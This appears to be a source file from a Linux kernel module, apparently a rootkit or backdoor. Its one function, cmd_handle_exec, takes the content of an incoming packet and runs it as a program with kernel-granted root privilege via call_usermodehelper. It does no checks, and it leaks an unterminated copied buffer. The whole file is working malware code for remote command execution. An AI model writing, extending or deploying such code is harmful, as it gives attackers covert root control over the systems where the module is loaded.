#include <linux/types.h>
#include <linux/module.h>

#include "handlers.h"
#include "../packet/packet.h"
#include "../../mem/mngt.h"

int cmd_handle_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{
    char* envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    char* argv[] = {NULL, NULL};

    // quick 'n dirty way to circumvent const
    u8* content_mod = kzmalloc(packet->content_len, GFP_KERNEL);
    memcpy(content_mod, packet->content, packet->content_len);

    argv[0] = content_mod;

    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}